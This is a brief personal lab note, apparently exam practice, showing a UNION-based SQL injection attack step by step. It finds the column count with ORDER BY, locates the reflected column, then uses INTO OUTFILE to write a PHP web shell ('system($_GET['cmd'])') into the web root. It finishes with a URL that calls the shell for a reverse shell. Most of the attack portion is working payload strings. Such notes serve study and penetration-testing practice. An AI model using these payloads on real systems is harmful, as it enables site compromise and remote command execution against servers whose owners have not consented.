# 10.3.2 Q5

> [!NOTE]
> **CHECK EVERY FUCKING BUTTONS**

GET TO KNOW YOUR INJECTED PLACE

FIND WHERE IT'S OUTPUT IS SHOWING

![[Pasted image 20240507222625.png]]

### To get columns
```
' ORDER BY 7-- //
(URL ENCODED)
```

Here we got 6 columns and then we get to know which column show the string to the frontpage by checking data types

![[Pasted image 20240507222918.png]]

And it says that we can manipulate column 5!

### Check datatypes
```
'+UNION+SELECT+NULL,NULL,NULL,NULL,'A',NULL+--+//
```


Then I just upload webshell.php with help of UNION based SQLi

```
'+UNION+SELECT+null,+null,+null,+null,"<%3fphp+system($_GET['cmd'])%3b%3f>",null+INTO+OUTFILE+"/var/www/html/webshell1.php"+--+//
```

### Path
```
http://IP/webshell.php?cmd=revshell
```

if we cannot upload to /var/www/html/tmp that means we have not any permission to make tmp directory!





hulabaloo